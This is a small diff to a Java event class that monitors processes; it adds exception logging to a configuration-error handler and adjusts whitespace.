@@ -40,7 +40,7 @@ public class EventProcess extends BaseEvent implements Observer<ProcessInfo> {
 	@Override
 	public void actualStop() {
 		ListenerProcess.self().detach(this);
-		
+
 		onExit(); // di sicurezza
 	}
 
@@ -51,6 +51,10 @@ public class EventProcess extends BaseEvent implements Observer<ProcessInfo> {
 			focus = conf.getBoolean("focus");
 			starname = conf.getString("process");
 		} catch (final ConfigurationException e) {
+			if (Cfg.EXCEPTION) {
+				Check.log(e);
+			}
+
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Error: params FAILED");//$NON-NLS-1$
 			}
